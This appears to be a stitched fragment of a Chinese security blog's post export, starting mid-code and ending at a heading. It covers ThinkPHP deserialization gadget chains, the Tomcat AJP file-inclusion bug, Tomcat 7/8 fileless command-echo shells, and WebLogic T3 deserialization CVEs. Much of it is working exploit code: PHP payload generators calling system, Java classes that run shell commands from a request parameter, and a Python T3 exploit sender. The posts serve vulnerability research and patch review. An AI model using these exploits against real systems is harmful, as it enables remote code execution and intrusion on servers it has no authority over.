(isset($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 $item[$key] = $val-&gt;toArray(); } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } trait Attribute{ protected $strict = true; private $data = ['key' =&gt; 'whoami']; private $withAttr = ['key' =&gt; 'system']; protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); //$method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this-&gt;withAttr[$fieldName])) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $closure = $this-&gt;withAttr[$fieldName]; $value = $closure($value, $this-&gt;data); } elseif (method_exists($this, $method)) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $value = $this-&gt;$method($value, $this-&gt;data); } elseif (isset($this-&gt;type[$fieldName])) { // 类型转换 $value = $this-&gt;readTransform($value, $this-&gt;type[$fieldName]); } elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [$this-&gt;createTime, $this-&gt;updateTime])) { $value = $this-&gt;getTimestampValue($value); } elseif ($relation) { $value = $this-&gt;getRelationAttribute($name); } return $value; } public function getAttr(string $name) { try { $relation = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this-&gt;getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this-&gt;data; } $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } protected function getRealFieldName(string $name): string { return $this-&gt;strict ? $name : App::parseName($name); } } trait RelationShip { private $relation = []; } } namespace think { abstract class Model { use model\\concern\\Attribute; use model\\concern\\Conversion; use model\\concern\\RelationShip; } } namespace think\\model { use think\\Model; class Pivot extends Model{} } namespace { $conversion = new think\\model\\Pivot(); //$conversion-&gt;__toString(); $windows = new think\\process\\pipes\\Windows(); $windows-&gt;setFile($conversion); echo urlencode(serialize($windows)); } ThinkPHP6.X 123composer create-project --prefer-dist topthink/think=6.0.x-dev tp6xcd tp6x./think run ThinkPHP6.x 的代码移除了 think\\process\\pipes\\Windows 类，但POP链__toString 之后的 Gadget 仍然存在，所以再找一个可触发__toString的点即可。 vendor/topthink/think-orm/src/Model.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288&lt;?php namespace think{ abstract class Model{ use model\\concern\\ModelEvent; use model\\concern\\Attribute; use model\\concern\\TimeStamp; use model\\concern\\RelationShip; use model\\concern\\Conversion; private $lazySave = True; private $exists = True; private $force = True; protected $table = ''; protected $suffix = ''; public function __destruct() { if ($this-&gt;lazySave) { $this-&gt;save(); } } public function save(array $data = [], string $sequence = null): bool { if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) { return false; } $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); return true; } public function isEmpty(): bool { return empty($this-&gt;data); } protected function updateData(): bool { // 事件回调 if (false === $this-&gt;trigger('BeforeUpdate')) { return false; } //$this-&gt;checkData(); // 获取有更新的数据 $data = $this-&gt;getChangedData(); if (empty($data)) { // 关联更新 if (!empty($this-&gt;relationWrite)) { $this-&gt;autoRelationUpdate(); } return true; } if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) { // 自动写入更新时间 $data[$this-&gt;updateTime] = $this-&gt;autoWriteTimestamp($this-&gt;updateTime); $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime]; } // 检查允许字段 $allowFields = $this-&gt;checkAllowFields(); } protected function checkAllowFields(): array { if (empty($this-&gt;field)) { if (!empty($this-&gt;schema)) { $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); } else { //$query = $this-&gt;db(); $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); } return $this-&gt;field; } } public function setTable($table){ $this-&gt;table = $table; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{} } namespace think\\model\\concern{ trait Attribute{ protected $strict = true; private $data = ['key' =&gt; 'whoami']; private $withAttr = ['key' =&gt; 'system']; protected $field = []; protected $schema = []; public function getChangedData(): array { $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) { if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) { return 1; } return is_object($a) || $a != $b ? 1 : 0; }); // 只读字段不允许更新 foreach ($this-&gt;readonly as $key =&gt; $field) { if (isset($data[$field])) { unset($data[$field]); } } return $data; } protected function getValue(string $name, $value, bool $relation = false) { // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); //$method = 'get' . App::parseName($name, 1) . 'Attr'; if (isset($this-&gt;withAttr[$fieldName])) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $closure = $this-&gt;withAttr[$fieldName]; var_dump($closure, $value); $value = $closure($value, $this-&gt;data); } elseif (method_exists($this, $method)) { if ($relation) { $value = $this-&gt;getRelationValue($name); } $value = $this-&gt;$method($value, $this-&gt;data); } elseif (isset($this-&gt;type[$fieldName])) { // 类型转换 $value = $this-&gt;readTransform($value, $this-&gt;type[$fieldName]); } elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($fieldName, [$this-&gt;createTime, $this-&gt;updateTime])) { $value = $this-&gt;getTimestampValue($value); } elseif ($relation) { $value = $this-&gt;getRelationAttribute($name); } return $value; } public function getAttr(string $name) { try { $relation = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $relation = true; $value = null; } return $this-&gt;getValue($name, $value, $relation); } public function getData(string $name = null) { if (is_null($name)) { return $this-&gt;data; } $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) { return $this-&gt;data[$fieldName]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name); } protected function getRealFieldName(string $name): string { return $this-&gt;strict ? $name : App::parseName($name); } } trait ModelEvent{ protected $withEvent = false; protected function trigger(string $event): bool { if (!$this-&gt;withEvent) { return true; } } } trait TimeStamp{ protected $autoWriteTimestamp = False; } trait RelationShip { private $relation = []; } trait Conversion{ protected $visable = ['key' =&gt; 'value']; public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 $item[$key] = $val-&gt;toArray(); } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } return $item; } public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); } public function __toString() { return $this-&gt;toJson(); } } } namespace { $model = new think\\model\\Pivot(); $model-&gt;setTable($model); echo urlencode(serialize($model)); } 个人方法论 反序列化起点 起点只有两个 __walkup __destrusct 反序列化的中继点 要是某段代码等价于形如$this-&gt;obj1-&gt;method()，中继点可以是obj2的同名method方法，也可以是obj3__call方法 处理字符串的函数(可控$obj)，中继点可以是$obj的__toString 某段代码形如$this-&gt;obj[$key]，中继点可以__get或者实现了ArrayAccess的接口。 某段代码里面有new了新对象，那么中继点可以是那个对象的__contrust方法 总结一下触发__toString的 php内置函数会把传入变量当作字符串处理的时候，例如file_exists()，sprintf 与其它字符串发生运算的时候例如.、== php原生代码里面的异常处理类存在tostring调用点，实际使用时很好用 反序列化的终点 一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用__call_user_func(\\$method, $args)，__call_user_func_array([\\$obj,\\$method], $args)，例如tp5.1 动态调用的方法，$可控方法($可控参数)，例如tp5.2 书写exp时候注意事项 尽量不进行省略步骤性质的优化，防止出现exp可以但实际环境不成功人为玄学的情况。 对单行执行的不获取返回值的函数进行省略（只要函数内部没有不会抛出异常）。 触发流程之后的代码都可以省略掉。 上面讲的个人心得是脱离框架写exp的思路，maybe直接在框架下的某个路由写exp效率更高。 杂 受phar影响的函数 fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 参考 挖掘暗藏ThinkPHP中的反序列利用链 ThinkPHP5.1.X反序列化利用链 ThinkPHP5.2.x反序列化利用链 ThinkPHP6.X反序列化利用链 N1CTF2019 sql_manage出题笔记","link":"/2019/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/"},{"title":"tomcat ajp 漏洞分析","text":"什么是ajp 简单理解成http的二进制优化版。 tomcat结构 在Container部分，一个Host代表一个虚拟主机，一个Context代码一套web程序，一个Wrapper代表一个serlvlet。一个tomcat可以有多个Host，一个Host可以有多个Context，一个Context往往有多个Wrapper。 在Conector部分Endpoint的Acceptor监听连接，Handler用于处理接收到的Socket，在内部调用Processor进行处理。processor把信息读取出来并设置进request中对象最后交给Adaptor，Adapter将请求适配到Servlet容器进行具体的处理。 环境说明 tomcat 7.0.96 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.--&gt;&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot; version=&quot;3.0&quot; metadata-complete=&quot;true&quot;&gt; &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt; &lt;description&gt; Welcome to Tomcat &lt;/description&gt;&lt;/web-app&gt; 代码流程跟踪 代码跟踪从handler调用processor的process开始。 process里面有两部很重要一个是prepareRequest，另一个是this.adapter.service。 prepareRequest 先来看prepareRequest。顾名思义，这个函数的作用是把ajp的二进制版的http数据读取（请求方法，请求路径，http头等信息，不每处都截图了）并设置进request对象，然后设置一些对header和cookies长度或数量做一些限制。 接下来会读取一个叫attributeCode的东西，payload有意把它设置成了10。这样他会把我们在payload中构造的attributes设置进request对象的attribute，后面任意读文件或者包含祸起就是从这里开始的。 1234567file_path = &quot;/WEB-INF/web.xml&quot;attributes = [ {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.request_uri&quot;, &quot;/&quot;,)}, {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.path_info&quot;, file_path,)}, {&quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (&quot;javax.servlet.include.servlet_path&quot;, &quot;/&quot;,)},] adapter.service 在adapter.service中会在postParseRequest中对url进行处理及合法性检查（这里面可能涉及到对url权限校验的问题以后有机会再聊）。如果合法的会进入下面的invoke。 跟进invoke后会发现是一连串疯狂的invoke，这里取几个有代表性的截图 StandardEngineValve invoke StandardHostValve invoke StandardContextValve invoke 最后进入StandardWrapperValve的invoke wrapper.allocate会返回这次请求对应的servlet，因为我们访问路径是/，所以默认对应index.jsp，所以由jspServlet来处理。 接下来进入过滤器链 doFilter内部调用internalDoFilter 在internalDoFilter中会遍历所有注册过的filter然后进行过滤。遍历完成后会调用对应servlet的services方法。 这里会把payload中的 javax.servlet.include.request_uri javax.servlet.include.path_info提取并拼接到一起形成jspUri。 这里jspUri会被传入，正常情况下这里传入的是jsp，tomcat会把jsp转为servlet，但是因为我们传入的路径是是非jsp文件不符合语法所以这部分原样输出。因此另一种使用方法也呼之欲出，如果有一个上传洞可以把文件上传到webapp目录下(不管什么后缀）那么我们可以包含这个文件达到rce效果（和php很像）。 补充，只能包含webapp下面的东西。在读取之前会对传入的路径进行格式化，并在格式化后强制加/，无法…/跳出。 代码流程跟踪图 受影响版本 Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 其他 文中分析的是最理想的情况实际利用会受到过滤器或是框架的影响关于这部分内容可以看如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938) 参考 Tomcat Ajp协议文件包含漏洞分析 tomcat幽灵猫分析","link":"/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"tomcat不出网回显连续剧第六集","text":"首发于先知社区 前情提要 这周回顾了一下我看到的前人关于tomcat回显和无文件webshell的文章。发现各个师傅的方法各有优劣，下面简单总结一下（总结不对的地方还请各位师傅指出）。 基于内存 Webshell 的无文件攻击技术研究，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。 Tomcat中一种半通用回显方法，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。 基于tomcat的内存 Webshell 无文件攻击技术，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。 基于全局储存的新思路 | Tomcat的一种通用回显方法研究，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。 基于Tomcat无文件Webshell研究，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。 所以这里提出一种新的回显方案解决一下tomcat7+shiro这个阴暗的角落（经测试tomcat8仍然适用）。 测试环境：macos+tomcat7,8+shiro-simple-web 再看register 在上面提到的第四篇文章中提到包含有request（有了request就有response）的rp会被储存在global中，但其实再往下看会发现rp被注册进了组件。 既然注册进去了肯定存放在哪里的，接下来动静结合调代码找就好了，代码跟踪过于冗长而且我也没细细探究每一步的意义，就不装模作样的分析了，这里直接给结论。 通过idea的计算功能我们可以符合直觉的拿到response，实际想获取还是需要各种反射的。tomcat7,8获取这条链的方式大同小异，变化之处在于name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio。关于bio，nio的细节可以参考这篇文章。 除此之外在实际场景下会有很多requests是要遍历processors中的各个requests。 demo代码 tomcat8的demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.coyote.Request;import org.apache.tomcat.util.buf.ByteChunk;import org.apache.tomcat.util.modeler.Registry;import javax.management.MBeanServer;import java.io.InputStream;import java.lang.reflect.Field;import java.util.ArrayList;import java.util.HashMap;import java.util.Scanner;public class tomcat82 extends AbstractTranslet { public tomcat82() { try{ MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer(); Field field = Class.forName(&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;).getDeclaredField(&quot;mbsInterceptor&quot;); field.setAccessible(true); Object obj = field.get(mbeanServer); field = Class.forName(&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;).getDeclaredField(&quot;repository&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;com.sun.jmx.mbeanserver.Repository&quot;).getDeclaredField(&quot;domainTb&quot;); field.setAccessible(true); HashMap obj2 = (HashMap)field.get(obj); obj = ((HashMap)obj2.get(&quot;Catalina&quot;)).get(&quot;name=\\&quot;http-nio-8888\\&quot;,type=GlobalRequestProcessor&quot;); field = Class.forName(&quot;com.sun.jmx.mbeanserver.NamedObject&quot;).getDeclaredField(&quot;object&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;).getDeclaredField(&quot;resource&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;); field.setAccessible(true); ArrayList obj3 = (ArrayList)field.get(obj); field = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;); field.setAccessible(true); boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) { isLinux = false; } for (int i = 0; i &lt; obj3.size(); i++) { Request obj4 = (Request) field.get(obj3.get(i)); String username = obj4.getParameters().getParameter(&quot;username&quot;); if(username != null){ String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, username} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, username}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;); String output = &quot;&quot;; while (s.hasNext()){ output += s.next(); } byte[] buf = output.getBytes(); ByteChunk bc = new ByteChunk(); bc.setBytes(buf, 0, buf.length); obj4.getResponse().doWrite(bc); break; } } } catch (Exception e){ } } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} tomcat7的demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.coyote.Request;import org.apache.tomcat.util.buf.ByteChunk;import org.apache.tomcat.util.modeler.Registry;import javax.management.MBeanServer;import java.io.InputStream;import java.lang.reflect.Field;import java.util.ArrayList;import java.util.HashMap;import java.util.Scanner;public class tomcat72 extends AbstractTranslet { public tomcat72(){ try{ MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer(); Field field = Class.forName(&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;).getDeclaredField(&quot;mbsInterceptor&quot;); field.setAccessible(true); Object obj = field.get(mbeanServer); field = Class.forName(&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;).getDeclaredField(&quot;repository&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;com.sun.jmx.mbeanserver.Repository&quot;).getDeclaredField(&quot;domainTb&quot;); field.setAccessible(true); HashMap obj2 = (HashMap)field.get(obj); obj = ((HashMap)obj2.get(&quot;Catalina&quot;)).get(&quot;name=\\&quot;http-bio-8888\\&quot;,type=GlobalRequestProcessor&quot;); field = Class.forName(&quot;com.sun.jmx.mbeanserver.NamedObject&quot;).getDeclaredField(&quot;object&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;).getDeclaredField(&quot;resource&quot;); field.setAccessible(true); obj = field.get(obj); field = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;); field.setAccessible(true); ArrayList obj3 = (ArrayList)field.get(obj); field = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;); field.setAccessible(true); boolean isLinux = true; String osTyp = System.getProperty(&quot;os.name&quot;); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) { isLinux = false; } for (int i = 0; i &lt; obj3.size(); i++) { Request obj4 = (Request) field.get(obj3.get(i)); String username = obj4.getParameters().getParameter(&quot;username&quot;); if(username != null){ String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, username} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, username}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(&quot;\\\\a&quot;); String output = &quot;&quot;; while (s.hasNext()){ output += s.next(); } byte[] buf = output.getBytes(); ByteChunk bc = new ByteChunk(); bc.setBytes(buf, 0, buf.length); obj4.getResponse().doWrite(bc); break; } } } catch (Exception e) {// System.out.println(&quot;=======================&quot;);// System.out.println(e); } } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 另外如果有师傅在复现的时候发现header超长，可以参考缩小ysoserial payload体积的几个方法。（也可以参考长亭师傅给的修改header头的思路，实际弄走的时候也许会遇到一些坑） tomcat7+simple-shiro-web成功复现 最后 感谢大师傅们开源的自己的思路，学到很多。其次在研究这种方法的时候发现还有其他很多MBean，也许还有很多好玩的东西？","link":"/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/"},{"title":"weblogic历史T3反序列化漏洞及补丁梳理","text":"环境搭建 使用ateam大哥开源的调试环境Weblogic环境搭建工具 漏洞环境搭建 12docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 .docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 调试环境搭建 将weblogic依赖的jar包拷贝出来并导入idea。 1234mkdir wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib 远程调试配置 T3 协议说明 t3是oracle对rmi的增强，和rmi一样在网络间传输时数据是序列化过的。文章的重点在于分析漏洞以及补丁为什么可以绕过，就不分析t3协议数据的格式了，在复现时我们只需要将生成的恶意序列化数据套在py模版中即可。如果有师傅想对weblogic体系及其t3协议的正常使用感兴趣推荐阅读WebLogic安全研究报告。 CVE-2015-4852 t3协议的传输过来的数据会在weblogic.rjvm.InboundMsgAbbrev#readObject中读取并进行反序列化。 因为是t3第一洞所以可以看到ServerChannelInputStream的resolveClass并没有任何做防御。 自带cc链 所以只需要把ysoserial的生成的payload嵌入t3协议即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import socketimport sysimport structimport reimport subprocessimport binasciidef get_payload1(gadget, command): JAR_FILE = '/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar' popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE) return popen.stdout.read()def get_payload2(path): with open(path, &quot;rb&quot;) as f: return f.read()def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = &quot;t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n&quot;.encode() sock.sendall(handshake) data = sock.recv(1024) pattern = re.compile(r&quot;HELO:(.*).false&quot;) version = re.findall(pattern, data.decode()) if len(version) == 0: print(&quot;Not Weblogic&quot;) return print(&quot;Weblogic {}&quot;.format(version[0])) data_len = binascii.a2b_hex(b&quot;00000000&quot;) #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;) #t3协议头 flag = binascii.a2b_hex(b&quot;fe010000&quot;) #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload)if __name__ == &quot;__main__&quot;: host = &quot;127.0.0.1&quot; port = 7001 gadget = &quot;CommonsCollections1&quot; #CommonsCollections1 Jdk7u21 command = &quot;touch /tmp/CVE-2015-4852&quot; payload = get_payload1(gadget, command) exp(host, port, payload) CVE-2015-4852的修复 补丁：2016年1月 p21984589_1036_Generic 修复方法是在resolveClass中引入了 ClassFilter.isBlackListed进行过滤，跟进weblogic.rmi.ClassFilter可以看到黑名单内容。 除此之外，另外几个反序列化点也被加了相同的过滤（不一一打开看了）。 反序列化两个关键点，一个是触发反序列化的点，二是gadget。现在反序列化触发点有了，后面的t3的cve就是绕黑名单的各种技巧了。 为了让后面的分析更具有说服力，这里以10.3.6为例说明如何打补丁。 12345678docker run -it -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bashdocker cp /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Genericdocker exec -it weblogic1036jdk7u21 /bin/bashcd /p21984589_1036_Genericmv patch-catalog_23510.xml patch-catalog.xmlcd /u01/app/oracle/middleware/utils/bsu./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver//u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh 如果打补丁时出现如下错误需要自行把bsu.sh中的内存参数MEM_ARGS调大一点。 成功后截图如下 这时再尝试打会出现Unauthorized CVE-2016-0638 weblogic.jms.common.StreamMessageImpl没在黑名单，在其反序列化时会读取一段数据并进行反序列化，我们可以把这段数据伪造成rce payload。 1234567891011121314151617181920212223242526272829303132333435import weblogic.jms.common.StreamMessageImpl;import java.io.*;public class CVE_2016_0638 { public static void main(String[] args) throws IOException { byte[] payload = exec(&quot;CommonsCollections1&quot;, &quot;touch /tmp/CVE_2016_0638&quot;); StreamMessageImpl streamMessage = new StreamMessageImpl(payload); ser(streamMessage, &quot;CVE_2016_0638.ser&quot;); } public static byte[] exec(String gadget, String command) throws IOException { String[] cmd = {&quot;java&quot;, &quot;-jar&quot;, &quot;/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar&quot;, gadget, command}; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[4096]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } return baos.toByteArray(); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(&quot;-------序列化成功&quot; + serName); }} 乱入一个QA Q：StreamMessageImpl可以过黑名单很好理解，但是为啥CommonsCollections1依旧可以成功，CommonsCollections1(org.apache.commons.collections.functors)不是在黑名单里面吗？ A：答案是ServerChannelInputStream没有过滤到org.apache.commons.collections.functors（废话）。细节是这样的：ServerChannelInputStream的resolveClass检验到是StreamMessageImpl，不在黑名单里面，通过。然后在反序列化流程中会调用StreamMessageImpl的readExternal，readExternal内部又new了新的ObjectInputStream（以后简称ois）并从缓冲区读反序列化数据再次调用readObject，这里原生的ois就是原生的resolveClass方法没有过滤。 CVE-2016-0638的修复 补丁：2016年4月p22505423_1036_Generic 把原生的ois换成了FilteringObjectInputStream CVE-2016-3510 